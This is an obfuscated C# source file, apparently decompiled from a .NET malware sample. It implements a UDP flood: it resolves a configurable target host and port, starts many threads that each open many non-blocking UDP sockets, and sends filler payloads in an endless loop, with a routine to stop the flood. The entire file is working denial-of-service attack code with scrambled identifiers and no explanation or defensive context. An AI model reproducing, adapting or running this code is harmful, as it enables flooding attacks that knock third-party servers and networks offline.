using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

public class QpFwhPRlOTgdMZyyajvXrWu
{
	private class ppoteXeJjVlorjIlQzvkFvm
	{
		private Socket[] tYWEsNDtISBBnnPYkMgLjCN;

		private IPEndPoint CysLIfPZfbnEFaclJqTjQWp;

		private int xmSOONSDvDhItKNQIgKoYUJ;

		private byte[] dUKYiRREqSoBPwOzEeSPJbY;

		public ppoteXeJjVlorjIlQzvkFvm(IPEndPoint vRpvrEHVqsCMHkzSmGzpVee, int diTMTxLKadgYwMFoXZtWboy)
		{
			CysLIfPZfbnEFaclJqTjQWp = vRpvrEHVqsCMHkzSmGzpVee;
			xmSOONSDvDhItKNQIgKoYUJ = diTMTxLKadgYwMFoXZtWboy;
		}

		private static void iviVvSRtbseiIitnGDZvUMI(IAsyncResult ar)
		{
		}

		public void Send()
		{
			checked
			{
				try
				{
					tYWEsNDtISBBnnPYkMgLjCN = new Socket[xmSOONSDvDhItKNQIgKoYUJ - 1 + 1];
					int num = xmSOONSDvDhItKNQIgKoYUJ - 1;
					int i;
					for (i = 0; i <= num; i++)
					{
						tYWEsNDtISBBnnPYkMgLjCN[i] = new Socket(CysLIfPZfbnEFaclJqTjQWp.AddressFamily, SocketType.Dgram, ProtocolType.Udp);
						tYWEsNDtISBBnnPYkMgLjCN[i].Blocking = false;
						tYWEsNDtISBBnnPYkMgLjCN[i].BeginConnect(CysLIfPZfbnEFaclJqTjQWp, iviVvSRtbseiIitnGDZvUMI, tYWEsNDtISBBnnPYkMgLjCN[i]);
					}
					Thread.Sleep(10);
					int num2 = xmSOONSDvDhItKNQIgKoYUJ - 1;
					i = 0;
					while (true)
					{
						if (i <= num2)
						{
							if (tYWEsNDtISBBnnPYkMgLjCN[i].Connected)
							{
								break;
							}
							i++;
							continue;
						}
						return;
					}
					if (gjmeDSLucfzcguranNNowJl == 2)
					{
						dUKYiRREqSoBPwOzEeSPJbY = Encoding.UTF8.GetBytes("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
					}
					else if (gjmeDSLucfzcguranNNowJl == 3)
					{
						dUKYiRREqSoBPwOzEeSPJbY = Encoding.UTF8.GetBytes("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
					}
					else
					{
						dUKYiRREqSoBPwOzEeSPJbY = Encoding.UTF8.GetBytes("~");
					}
					while (true)
					{
						Thread.Sleep(0);
						tYWEsNDtISBBnnPYkMgLjCN[i].Send(dUKYiRREqSoBPwOzEeSPJbY, SocketFlags.Partial);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private static ThreadStart[] NmNYSkTqakqmyPelnwUPsub;

	private static Thread[] hBJxdZZYdOUcsTSiYbTrVzx;

	private static IPEndPoint fUoeVjtccPQqzMoImLdpdaU;

	private static ppoteXeJjVlorjIlQzvkFvm[] mjHqBHDPfgCENkSvLrxRZOu;

	public static string lhswLghrBvZpIcvpfLUUSXJ;

	public static bool zKssgStQcqYpbfGtqkDBXsR;

	public static int CJnzzPTWOmCueMPjMQeoKXK;

	public static int wYtsVDUGKjKVPheCXvnkvNb;

	public static int wktSMprYsxGvbkkjnLSZEQQ;

	public static short gjmeDSLucfzcguranNNowJl;

	public static void FkJazalfxhEnyEBMdrzBKid()
	{
		try
		{
			IPAddress[] addressList = Dns.GetHostEntry(lhswLghrBvZpIcvpfLUUSXJ).AddressList;
			fUoeVjtccPQqzMoImLdpdaU = new IPEndPoint(addressList[0], CJnzzPTWOmCueMPjMQeoKXK);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			IPAddress address = IPAddress.Parse(lhswLghrBvZpIcvpfLUUSXJ);
			fUoeVjtccPQqzMoImLdpdaU = new IPEndPoint(address, CJnzzPTWOmCueMPjMQeoKXK);
			ProjectData.ClearProjectError();
		}
		checked
		{
			hBJxdZZYdOUcsTSiYbTrVzx = new Thread[wktSMprYsxGvbkkjnLSZEQQ - 1 + 1];
			NmNYSkTqakqmyPelnwUPsub = new ThreadStart[wktSMprYsxGvbkkjnLSZEQQ - 1 + 1];
			mjHqBHDPfgCENkSvLrxRZOu = new ppoteXeJjVlorjIlQzvkFvm[wktSMprYsxGvbkkjnLSZEQQ - 1 + 1];
			int num = wktSMprYsxGvbkkjnLSZEQQ - 1;
			for (int i = 0; i <= num; i++)
			{
				mjHqBHDPfgCENkSvLrxRZOu[i] = new ppoteXeJjVlorjIlQzvkFvm(fUoeVjtccPQqzMoImLdpdaU, wYtsVDUGKjKVPheCXvnkvNb);
				NmNYSkTqakqmyPelnwUPsub[i] = mjHqBHDPfgCENkSvLrxRZOu[i].Send;
				hBJxdZZYdOUcsTSiYbTrVzx[i] = new Thread(NmNYSkTqakqmyPelnwUPsub[i]);
				hBJxdZZYdOUcsTSiYbTrVzx[i].Start();
			}
			zKssgStQcqYpbfGtqkDBXsR = true;
		}
	}

	public static void GIouOWMrmnlqbipGhgwmogG()
	{
		checked
		{
			int num = wktSMprYsxGvbkkjnLSZEQQ - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					hBJxdZZYdOUcsTSiYbTrVzx[i].Abort();
					hBJxdZZYdOUcsTSiYbTrVzx[i] = null;
					NmNYSkTqakqmyPelnwUPsub[i] = null;
					mjHqBHDPfgCENkSvLrxRZOu[i] = null;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			zKssgStQcqYpbfGtqkDBXsR = false;
		}
	}
}
